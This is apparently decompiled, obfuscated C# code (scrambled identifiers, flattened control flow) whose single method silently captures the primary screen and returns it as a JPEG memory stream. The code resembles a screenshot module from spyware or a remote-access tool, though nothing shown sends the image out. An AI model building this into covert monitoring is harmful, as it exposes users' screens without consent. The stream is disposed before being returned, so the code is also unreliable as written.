using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Windows.Forms;

namespace q9Ep;

public class HKwvB2YERd
{
	public static MemoryStream MPHX3U()
	{
		//IL_0067: Unknown result type (might be due to invalid IL or missing references)
		//IL_0070: Expected Obj, but got Unknown
		//IL_008f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0098: Expected Obj, but got Unknown
		//IL_0161: Unknown result type (might be due to invalid IL or missing references)
		//IL_016a: Expected Obj, but got Unknown
		int num = 0;
		Rectangle bounds = default;
		Bitmap val = default;
		EncoderParameters val2 = default;
		ImageCodecInfo val3 = default;
		Encoder quality = default;
		Graphics val4 = default;
		EncoderParameter val5 = default;
		Size size = default;
		do
		{
			if (num == 2)
			{
				bounds = Screen.PrimaryScreen.Bounds;
				num = 3;
			}
			if (num == 3)
			{
				val = new Bitmap(bounds.Width, Screen.PrimaryScreen.Bounds.Height);
				num = 4;
			}
			if (num == 4)
			{
				val2 = new EncoderParameters(1);
				num = 5;
			}
			if (num == 6)
			{
				val3 = FZ9K2n1R.Kw2HO39hTDF(ImageFormat.Jpeg);
				num = 7;
			}
			if (num == 5)
			{
				quality = Encoder.Quality;
				num = 6;
			}
			if (num == 9)
			{
				val4 = Graphics.FromImage((Image)(object)val);
				num = 10;
			}
			if (num == 8)
			{
				val2.Param[0] = val5;
				num = 9;
			}
			if (num == 7)
			{
				val5 = new EncoderParameter(quality, (long)Convert.ToInt32(60L));
				num = 8;
			}
			if (num == 1)
			{
				size = new Size(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
				num = 2;
			}
			if (num == 0)
			{
				num = 1;
			}
		}
		while (num != 10);
		try
		{
			val4.CopyFromScreen(new Point(0, 0), new Point(0, 0), size);
		}
		finally
		{
			((IDisposable)val4)?.Dispose();
		}
		using MemoryStream memoryStream = new MemoryStream();
		((Image)val).Save((Stream)memoryStream, val3, val2);
		memoryStream.Position = 0L;
		return memoryStream;
	}
}
